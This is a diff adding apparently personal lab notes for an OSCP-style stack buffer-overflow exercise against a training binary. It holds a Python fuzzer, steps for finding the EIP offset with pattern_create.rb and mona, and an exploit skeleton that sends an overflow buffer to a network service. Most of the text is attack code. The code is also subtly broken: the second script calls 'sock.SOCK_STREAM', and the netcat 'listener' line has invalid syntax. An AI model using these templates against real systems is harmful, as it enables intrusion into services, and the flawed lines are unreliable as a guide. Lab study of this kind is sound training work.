@@ -1,0 +1,73 @@
+Start off the vm. Start the immunity debugger(as administrator), open the oscp binary and run the debugger.
+On kali, set a netcat reverse listener nc ip_address 1337
+
+Mona Configuration
+The mona script has been pre-installed. I need to set working folder using !mona config -set workingfolder c:\mona\%p
+==============================================================================================================
+Fuzzing : A template fuzzer script as below; This will return the number of bytes that can crash the program
+==============================================================================================================
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "MACHINE_IP"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            s.recv(1024)
+            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+            s.send(bytes(string, "latin-1"))
+            s.recv(1024)
+    except:
+        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+        sys.exit(0)
+    string += 100 * "A"
+    time.sleep(1)
+==============================================================================================================    
+Crash Replication and Controlling EIP. 
+With this template we intend to find the offset.
+First we generate random characters using /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+The -l parameter is the value which crashed the program above.
+I then enter the generated pattern on the payload section below, rerun immunity debugger and run this exploit
+I then run mona script as !mona findmsp -distance 2000
+And finally check for offset : EIP contains normal pattern : ... (offset XXXX)
+--------------------------------------------------------------------
+I now proceed to update the offset value on the script, set the payload to an empty string,
+set the retn value to BBBB, rerun immunity debugger and run the script again.
+This time, the EIP register gets overwritten with the 4 B's (42424242).
+==============================================================================================================
+import socket
+
+ip = "MACHINE_IP"
+port = 1337
+
+prefix = "OVERFLOW1"
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
+
+try:
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(bytes(buffer + "\r\n", "latin-1"))
+    print("Done!")
+except:
+    print("Could not connect.")
+
+==============================================================================================================
